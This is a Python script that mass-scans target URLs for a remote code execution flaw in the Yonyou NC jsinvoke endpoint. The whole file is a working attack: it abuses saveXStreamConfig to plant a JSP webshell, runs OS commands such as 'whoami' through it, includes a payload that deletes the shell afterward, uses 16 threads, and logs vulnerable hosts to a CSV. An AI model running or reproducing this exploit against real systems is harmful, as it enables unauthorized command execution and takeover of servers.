#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import re
import sys
import time
import json
import queue
import base64
import urllib3
import hashlib
import requests
import threading
import os
import uuid
from bs4 import BeautifulSoup
import requests
from bs4 import BeautifulSoup
import base64
import random
import sys
import os
import urllib
import argparse
import multiprocessing
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests.packages.urllib3.exceptions import InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# getStr = input('请输入fofa查询语句:').encode('utf-8')
getStr = '''banner="MinIO" || header="MinIO" || title="MinIO Browser"'''.encode('utf-8')
chstr = str(base64.b64encode(getStr).decode('utf-8'))
# print(chstr)
command = 'whoami'
CSRF_PATTERN = re.compile(rb'csrf-token" content="(.*?)" />')
spider = set()
target_ip = []
target_ip_not = []
num = 1
dns = 'http://127.0.0.1'
save_url_set = set()
spider_dir = {}
proxies = None
# proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
#
# with open('111.jsp', 'w+') as jsp1:
#     jsp1.write('<% out.println("webtest");%>')


def run_2():
    global num
    queueLock.acquire()
    num += 1
    if num % 100 == 0:
        print('num = {}'.format(num))
    queueLock.release()
    headers = {
        'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0'
    }
    con_list = ["/uapjs/jsinvoke/?action=invoke"]
    webshell_url = url + '/472.jsp?spr1=javax.script.ScriptEngineManager'
    webshell_body = r'''spr2=try{load("nashorn%3amozilla_compat.js")%3b}catch(e){}importPackage(Packages.java.util)%3bimportPackage(Packages.java.lang)%3bimportPackage(Packages.java.io)%3bs%3d[2]%3bs[0]%3d'cmd'%3bs[1]%3d'/c+del%20472.jsp'%3ba%3d""%3bb%3djava.lang.Runtime.getRuntime().exec(s).getInputStream()%3boutput+%3d+new+BufferedReader(new+InputStreamReader(b))%3bwhile+((line%3doutput.readLine())+!%3d+null)+{a%3da%2bline%2b"\n"}%3ba'''
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=webshell_url, data=webshell_body, headers=headers, proxies=proxies, verify=False,
                                 timeout=(3, 3))
        if 'xml' in response.text and 'version=' in response.text and 'encoding' in response.text:
            print('url = {}存在漏洞'.format(url))
            print(response.text)
            vuln_set.add(url)
            return True
        else:
            print('response.status_code = ', response.status_code)
            return False
    except Exception as e:
        print('e')
    return False

def run(url):
    global num
    queueLock.acquire()
    num += 1
    if num % 100 == 0:
        print('num = {}'.format(num))
    queueLock.release()
    headers = {
        'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0'
    }
    con_list = ["/uapjs/jsinvoke/?action=invoke"]
    data = '''{"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${''.getClass().forName(param.spr1).newInstance().getEngineByName('javascript').eval(param.spr2)}","webapps/nc_web/472.jsp"]}'''
    webshell_url = url + '/472.jsp?spr1=javax.script.ScriptEngineManager'
    webshell_body = r'''spr2=try{load("nashorn%3amozilla_compat.js")%3b}catch(e){}importPackage(Packages.java.util)%3bimportPackage(Packages.java.lang)%3bimportPackage(Packages.java.io)%3bs%3d[2]%3bs[0]%3d'cmd'%3bs[1]%3d'/c+whoami'%3ba%3d""%3bb%3djava.lang.Runtime.getRuntime().exec(s).getInputStream()%3boutput+%3d+new+BufferedReader(new+InputStreamReader(b))%3bwhile+((line%3doutput.readLine())+!%3d+null)+{a%3da%2bline%2b"\n"}%3ba'''
    for con in con_list:
        check_url = url + con
        try:
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
            req_check = requests.get(url=check_url, headers=headers, proxies=proxies, verify=False, timeout=(3, 3))
            # reC = re.search(r'uid=.*?gid=', response.text, re.I | re.M)
            if req_check.status_code != 404:
                requests.post(url=check_url, data=data, headers=headers, proxies=proxies, verify=False,
                                         timeout=(3, 3))
                response = requests.post(url=webshell_url, data=webshell_body, headers=headers, proxies=proxies, verify=False,
                                         timeout=(3, 3))
                if 'xml' in response.text and 'version=' in response.text and 'encoding' in response.text :
                    print('url = {}存在漏洞'.format(url))
                    print(response.text)
                    vuln_set.add(url)
                    return True
                else:
                    print('response.status_code = ', response.status_code)
                    return False
            else:
                print('1')
        except Exception as e:
            print('e')
    return False


def begin_thread(q):
    while not q.empty():
        target1 = q.get()
        if run(target1):
            return True
        else:
            return False


if __name__ == '__main__':
    vuln_set = set()
    with open('not_save_url.txt', 'r+', encoding='utf-8') as test_url:
        for turl in test_url:
            turl = turl.replace('\n', '')
            spider.add(turl)
    print('spider len = ', len(spider))
    queueLock = threading.Lock()
    workQueue = queue.Queue()
    threads_list = []
    queueLock.acquire()
    for tar in spider:
        workQueue.put(tar)
    queueLock.release()

    while not workQueue.empty():
        for i in range(16):
            thread = threading.Thread(target=begin_thread, args=(workQueue,))
            threads_list.append(thread)
            thread.start()
        for thread in threads_list:
            thread.join()
    with open('20230331save_vuln_url.csv', 'w+', encoding='utf-8', errors='ignore') as saveurl:
        for vurl in vuln_set:
            saveurl.write(vurl + '\n')
